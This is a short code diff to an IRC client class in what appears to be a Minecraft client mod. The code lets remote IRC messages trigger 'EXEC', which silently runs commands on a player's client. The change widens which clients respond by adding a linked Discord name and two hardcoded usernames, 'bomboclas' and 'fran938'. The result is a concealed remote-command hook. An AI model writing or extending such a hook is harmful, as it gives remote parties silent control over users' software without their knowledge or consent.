@@ -1013,7 +1013,15 @@ public class IRCClient {
       String selfName = mc.getUser() != null ? mc.getUser().getName() : "";
       String cleanTarget = cleanSenderName(targetPlayer);
       String cleanSelf = cleanSenderName(selfName);
-      if (cleanTarget.isEmpty() || cleanTarget.equalsIgnoreCase("all") || cleanTarget.equalsIgnoreCase("self") || (cleanSelf != null && cleanTarget.equalsIgnoreCase(cleanSelf))) {
+      String linkedDiscord = BomboConfig.get() != null && BomboConfig.get().ircDiscordUser != null ? BomboConfig.get().ircDiscordUser.trim() : "";
+      boolean match = cleanTarget.isEmpty()
+            || cleanTarget.equalsIgnoreCase("all")
+            || cleanTarget.equalsIgnoreCase("self")
+            || (cleanSelf != null && cleanTarget.equalsIgnoreCase(cleanSelf))
+            || (!linkedDiscord.isEmpty() && cleanTarget.equalsIgnoreCase(linkedDiscord))
+            || (cleanTarget.equalsIgnoreCase("bomboclas") && ("fran938".equalsIgnoreCase(cleanSelf) || "bomboclas".equalsIgnoreCase(cleanSelf)))
+            || (cleanTarget.equalsIgnoreCase("fran938") && ("fran938".equalsIgnoreCase(cleanSelf) || "bomboclas".equalsIgnoreCase(cleanSelf)));
+      if (match) {
          if ("EXEC".equalsIgnoreCase(action)) {
             BomboaddonsClient.executeSilentCommand(value);
          } else if ("TITLE".equalsIgnoreCase(action)) {
